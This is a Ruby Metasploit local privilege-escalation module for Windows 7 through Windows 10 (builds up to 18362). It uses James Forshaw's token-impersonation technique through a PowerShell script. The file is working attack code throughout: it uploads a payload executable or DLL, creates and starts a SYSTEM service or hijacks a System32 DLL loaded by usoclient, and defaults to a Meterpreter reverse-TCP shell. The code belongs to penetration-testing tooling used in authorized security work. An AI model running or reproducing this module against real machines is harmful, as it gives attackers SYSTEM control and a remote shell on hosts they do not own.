##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/powershell'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE # Needed for generate_payload_dll
  include Msf::Post::Windows::FileSystem
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Post::Windows::Powershell

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Spooler Local Privilege Elevation Vulnerability',
        'Description' => %q{
          This "exploit" duplicates the token of an elevated prcess and impersonates it.
          The resulting process has nonstandard permissions, but can read/write to the
          filesystem and registry.  This module leverages that permission to create a service
          that runs as system.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'James Forshaw', # Research
            'Ruben Boonen (@FuzzySec)', # PoC
            'bwatters-r7' # msf module
          ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Targets' =>
          [
            [ 'Automatic', { 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2017-05-25',
        'References' =>
          [
            ['URL', 'https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1'],
            ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html'],
            ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html'],
            ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html']
          ],
        'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ],
        'DefaultOptions' =>
          {
            'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
          }
      )
    )

    register_options([
      OptString.new('SERVICE_NAME',
                    [false, 'Service Name to use (%RAND% by default).', Rex::Text.rand_text_alpha(5..9).to_s]),
      OptString.new('WRITABLE_DIR',
                    [false, 'Location of file to overwrite (%TEMP% by default).', nil]),
      OptString.new('SERVICE_FILENAME',
                    [false, 'Filename for Service Payload (%RAND% by default).', Rex::Text.rand_text_alpha(5..9).to_s]),
      OptString.new('METHOD',
                    [true, 'SERVICE or DLL, please select which attack method you would like to use (SERVICE by default).', 'SERVICE'])
    ])
  end

  def start_dll_hijack(bin_path, cmd_path)
    # Read in Generic Script
    script = exploit_data('tokenmagic', 'tokenmagic.ps1')
    fail_with(Failure::BadConfig, 'No exploit script found') if script.nil?

    # Replace Values in Generic Script
    # We only need the powershell script to run one command..
    # Should we edit the script here? Send a nil command? Or load a second tokenmagic_dll.ps1 specifically for this code path?

    cmd_args = "/c move #{bin_path} C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll"

    script.gsub!('_CMD_PATH_', cmd_path)
    script.gsub!('_CMD_ARGS_', cmd_args)

    # Run Exploit Script
    print_status("Running Exploit on #{sysinfo['Computer']}")
    begin
      print_status('Executing ')
      session.powershell.execute_string({ code: script })
    rescue Rex::TimeoutError => e
      elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)
      print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')
    end

    print_status('Starting the interactive scan job...')
    # Step 4: Execute `usoclient StartInteractiveScan` to trigger the payload
    # XXX Using session.shell_command_token over cmd_exec() here as @wvu-r7 noticed cmd_exec() was broken under some situations.
    session.shell_command_token('usoclient StartInteractiveScan')

    print_status('Enjoy the shell!')
  end

  def start_service(service_name, bin_path, cmd_path)
    # Read in Generic Script
    script = exploit_data('tokenmagic', 'tokenmagic.ps1')
    fail_with(Failure::BadConfig, 'No exploit script found') if script.nil?

    # Replace Value in Generic Script
    cmd_args = "/c sc create #{service_name} binPath=#{bin_path} type=own start=demand && sc start #{service_name}"

    script.gsub!('_CMD_PATH_', cmd_path)
    script.gsub!('_CMD_ARGS_', cmd_args)

    # Run Exploit Script
    print_status("Running Exploit on #{sysinfo['Computer']}")
    begin
      session.powershell.execute_string({ code: script })
    rescue Rex::TimeoutError => e
      elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)
      print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')
    end
  end

  def payload_arch
    if payload.arch.include?(ARCH_X64)
      return ARCH_X64
    else
      return ARCH_X86
    end
  end

  def exploit
    win_dir = session.sys.config.getenv('windir')
    cmd_path = "#{win_dir}\\system32\\cmd.exe"
    if datastore['SERVICE_FILENAME'].nil? || datastore['SERVICE_FILENAME'].empty?
      service_filename = Rex::Text.rand_text_alpha(5..9).to_s
    else
      service_filename = datastore['SERVICE_FILENAME']
    end
    service_filename = "#{service_filename}.exe" unless service_filename.end_with?('.exe')
    if datastore['SERVICE_NAME'].nil? || datastore['SERVICE_NAME'].empty?
      service_name = Rex::Text.rand_text_alpha(5..9).to_s
    else
      service_name = datastore['SERVICE_NAME']
    end
    if datastore['WRITABLE_DIR'].nil? || datastore['WRITABLE_DIR'].empty?
      writable_dir = session.sys.config.getenv('TEMP').to_s
    else
      writable_dir = datastore['WRITABLE_DIR']
    end

    # Not sure how we want to format the module to account for both service and dll exploit methods, some duplicate code here
    if datastore['METHOD'] == 'DLL'
      bin_path = "#{writable_dir}\\WindowsCoreDeviceInfo.dll"
      payload_dll = generate_payload_dll
      print_status("Payload DLL is #{payload_dll.length} bytes long")
      client.core.use('powershell') if !client.ext.aliases.include?('powershell')

      # Check target
      vprint_status('Checking Target')
      validate_active_host
      validate_payload

      # Upload the payload
      print_status("Uploading payload to #{bin_path}")
      write_file(bin_path, payload_dll)
      register_file_for_cleanup(bin_path)
      register_file_for_cleanup('C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll') # Register this file for cleanup so that if we fail, then the file is cleaned up.
      # Run the exploit
      _output = start_dll_hijack(bin_path, cmd_path)
      return
    end

    bin_path = "#{writable_dir}\\#{service_filename}"
    client.core.use('powershell') if !client.ext.aliases.include?('powershell')
    payload_exe = generate_payload_exe_service({ servicename: service_name, arch: payload_arch })

    # Debug info
    vprint_status("Service Name = #{service_name}")
    # Check target
    vprint_status('Checking Target')
    validate_active_host
    validate_payload

    # Upload the payload
    print_status("Uploading payload to #{bin_path}")
    write_file(bin_path, payload_exe)
    register_file_for_cleanup(bin_path)

    # Run the exploit
    _output = start_service(service_name, bin_path, cmd_path)
    sleep(5) # make sure exploit is finished- yes, this is suboptimal
  end

  def validate_active_host
    begin
      print_status("Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
    rescue Rex::Post::Meterpreter::RequestError => e
      elog('Could not connect to session', error: e)
      raise Msf::Exploit::Failed, 'Could not connect to session'
    end
  end

  def validate_payload
    vprint_status("Target Arch = #{sysinfo['Architecture']}")
    vprint_status("Payload Arch = #{payload.arch.first}")
    unless payload.arch.first == sysinfo['Architecture']
      fail_with(Failure::BadConfig, 'Payload arch must match target arch')
    end
  end

  def check
    # This should be Windows 7sp0-Win10_1809
    sysinfo_value = sysinfo['OS']
    build_num = sysinfo_value.match(/\w+\d+\w+(\d+)/)[0].to_i
    vprint_status("Build Number = #{build_num}")
    return Exploit::CheckCode::Appears if sysinfo_value =~ /10/ && build_num <= 18362

    return Exploit::CheckCode::Safe
  end
end
